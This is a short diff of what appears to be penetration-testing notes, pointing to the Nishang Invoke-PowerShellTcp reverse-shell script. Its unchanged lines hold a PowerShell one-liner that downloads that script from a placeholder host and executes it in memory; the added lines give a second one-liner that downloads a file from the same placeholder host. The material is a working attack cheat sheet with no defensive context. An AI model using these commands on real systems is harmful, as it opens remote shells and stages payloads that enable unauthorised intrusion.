@@ -13,3 +13,8 @@ https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.p
 ```
 powershell iex(New-Object Net.WebClient).DownloadString('http://ip/Invoke-PowerShellTcp.ps1');
 ```
+
+```
+powershell -c "(New-Object Net.WebClient).DownloadFile('http://ip/filename.ext','filename.ext')"
+```
+
